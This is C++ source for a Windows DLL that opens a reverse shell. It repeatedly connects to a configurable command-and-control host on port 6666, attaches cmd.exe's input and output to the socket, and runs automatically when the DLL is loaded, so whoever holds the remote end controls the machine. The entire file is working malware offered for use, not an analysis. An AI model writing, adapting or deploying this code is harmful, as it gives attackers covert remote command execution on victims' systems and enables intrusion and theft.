// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#pragma once
#include <WinSock2.h>
#include <Windows.h>
#include <WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
#include <iostream>
#define _WINSOCK_DEPRECATED_NO_WARNINGS

void GetShell(char* C2Host, int C2Port) {
	while (true) {
		Sleep(5000);
		SOCKET Socket;
		sockaddr_in addr;
		WSADATA winsockversion;
		WSAStartup(MAKEWORD(2, 2), &winsockversion);
		Socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;

		addr.sin_addr.s_addr = inet_addr(C2Host);
		addr.sin_port = htons(C2Port);

		if (WSAConnect(Socket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
			closesocket(Socket);
			WSACleanup();
			continue;
		}
		else {
			char RecvData[DEFAULT_BUFLEN];
			memset(RecvData, 0, sizeof(RecvData));
			int RecvCode = recv(Socket, RecvData, DEFAULT_BUFLEN, 0);
			if (RecvCode <= 0) {
				closesocket(Socket);
				WSACleanup();
				continue;
			}
			else {
				STARTUPINFO sinfo;
				PROCESS_INFORMATION pinfo;
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)Socket;
				CreateProcess(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);

				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(Socket, RecvData, DEFAULT_BUFLEN, 0);
				if (RecvCode <= 0) {
					closesocket(Socket);
					WSACleanup();
					continue;
				}
				if (strcmp(RecvData, "exit\n") == 0) {
					exit(0);
				}
			}
		}

	}

}
int main() {
	int port = 6666; //Port here
	std::string IP = ""; // IP here
	char* c2host = const_cast<char*>(IP.c_str());
	GetShell(c2host, port);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		main();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE; // This is just the code for the exe ported over to work as a dll
}
